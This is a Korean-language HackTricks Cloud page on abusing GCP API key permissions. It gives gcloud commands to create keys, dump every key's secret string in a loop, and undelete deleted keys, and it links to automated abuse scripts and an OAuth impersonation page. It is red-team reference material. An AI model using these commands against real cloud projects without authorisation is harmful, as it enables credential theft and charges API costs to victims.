# GCP - Apikeys 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 기교를 공유**하세요.

</details>

## Apikeys

다음 권한은 API 키를 생성하고 도용하는 데 유용합니다. 문서에서 언급되지 않은 것입니다: _API 키는 **주체 없이 응용 프로그램을 식별**하는 간단한 암호화된 문자열입니다. **공개 데이터에 익명으로 액세스**하는 데 유용하며, 할당량 및 **청구**를 위해 API 요청을 프로젝트와 **연결**하는 데 사용됩니다._

따라서 API 키를 사용하면 회사가 API 사용에 대해 지불하도록 할 수 있지만 권한 상승은 할 수 없습니다.

API 키에 대한 자세한 정보는 다음을 확인하세요:

{% content-ref url="../gcp-services/gcp-api-keys-enum.md" %}
[gcp-api-keys-enum.md](../gcp-services/gcp-api-keys-enum.md)
{% endcontent-ref %}

API 키를 생성하는 다른 방법은 다음을 확인하세요:

{% content-ref url="gcp-serviceusage-privesc.md" %}
[gcp-serviceusage-privesc.md](gcp-serviceusage-privesc.md)
{% endcontent-ref %}

### API 키 액세스 무차별 대입 <a href="#apikeys.keys.create" id="apikeys.keys.create"></a>

프로젝트에서 어떤 API가 활성화되어 있는지 또는 찾은 API 키에 적용된 제한이 무엇인지 모를 수 있으므로 [**https://github.com/ozguralp/gmapsapiscanner**](https://github.com/ozguralp/gmapsapiscanner) 도구를 실행하여 **API 키로 액세스할 수 있는 내용을 확인**하는 것이 흥미로울 것입니다.

### `apikeys.keys.create` <a href="#apikeys.keys.create" id="apikeys.keys.create"></a>

이 권한은 **API 키를 생성**하는 데 사용됩니다:
```bash
gcloud services api-keys create
Operation [operations/akmf.p7-[...]9] complete. Result: {
"@type":"type.googleapis.com/google.api.apikeys.v2.Key",
"createTime":"2022-01-26T12:23:06.281029Z",
"etag":"W/\"HOhA[...]==\"",
"keyString":"AIzaSy[...]oU",
"name":"projects/5[...]6/locations/global/keys/f707[...]e8",
"uid":"f707[...]e8",
"updateTime":"2022-01-26T12:23:06.378442Z"
}
```
[**여기에서 취약한 환경의 생성, 악용 및 정리를 자동화하는 스크립트를 찾을 수 있습니다**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/b-apikeys.keys.create.sh).

{% hint style="danger" %}
기본적으로 사용자는 새 프로젝트를 생성할 수 있는 권한을 가지며, 새 프로젝트에 Owner 역할이 부여됩니다. 따라서 사용자는 **프로젝트를 생성하고 이 프로젝트 내에 API 키를 생성**할 수 있습니다.
{% endhint %}

### `apikeys.keys.getKeyString` , `apikeys.keys.list` <a href="#apikeys.keys.getkeystringapikeys.keys.list" id="apikeys.keys.getkeystringapikeys.keys.list"></a>

이 권한은 **모든 apiKeys를 나열하고 가져오며, 키를 가져올 수 있게** 해줍니다.
```bash
for  key  in  $(gcloud services api-keys list --uri); do
gcloud services api-keys get-key-string "$key"
done
```
[**여기에서 취약한 환경의 생성, 악용 및 정리를 자동화하는 스크립트를 찾을 수 있습니다**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/c-apikeys.keys.getKeyString.sh).

### `apikeys.keys.undelete` , `apikeys.keys.list` <a href="#serviceusage.apikeys.regenerateapikeys.keys.list" id="serviceusage.apikeys.regenerateapikeys.keys.list"></a>

이 권한은 **삭제된 API 키를 나열하고 재생성**할 수 있게 해줍니다. **API 키는 undelete 작업이 완료된 후 출력에 제공됩니다**:
```bash
gcloud services api-keys list --show-deleted
gcloud services api-keys undelete <key-uid>
```
### 내부 OAuth 애플리케이션 생성하여 다른 작업자를 사칭하기

이 작업은 서비스 **`clientauthconfig`**에 속한다고 [문서](https://cloud.google.com/iap/docs/programmatic-oauth-clients#before-you-begin)에 명시되어 있으므로, 이를 수행하는 방법은 다음 페이지를 확인하십시오:

{% content-ref url="../../workspace-security/gws-google-platforms-phishing/" %}
[gws-google-platforms-phishing](../../workspace-security/gws-google-platforms-phishing/)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 처음부터 끝까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 **PR을 제출하여** 여러분의 해킹 기법을 공유하세요.

</details>
